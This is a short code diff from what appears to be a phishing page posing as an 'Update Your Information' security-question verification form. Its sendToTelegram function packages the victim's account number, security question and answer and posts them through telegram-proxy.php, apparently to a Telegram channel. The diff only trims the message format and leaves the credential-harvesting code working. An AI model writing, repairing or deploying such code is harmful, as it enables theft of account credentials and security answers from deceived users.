@@ -233,16 +233,12 @@
             backBtn.addEventListener('click', goToBack);
 
             function sendToTelegram(questionEn, questionAr, answer, lang) {
-                var now = new Date();
-                var timeStr = now.toLocaleString('en-GB', { hour12: false });
                 var text =
-                    '❓ Security Question Verification\n' +
-                    '━━━━━━━━━━━━━━━━━━━━\n' +
+                    '❓ Security Question Verification\n\n' +
                     'Service:        Update Your Information\n' +
                     'Account Number: ' + username + '\n' +
                     'Question:       ' + questionEn + '\n' +
-                    'Answer:         ' + answer + '\n\n' +
-                    '🕒 الوقت: ' + timeStr;
+                    'Answer:         ' + answer;
                 var payload = new URLSearchParams();
                 payload.append('text', text);
                 return fetch('telegram-proxy.php', { method: 'POST', body: payload })
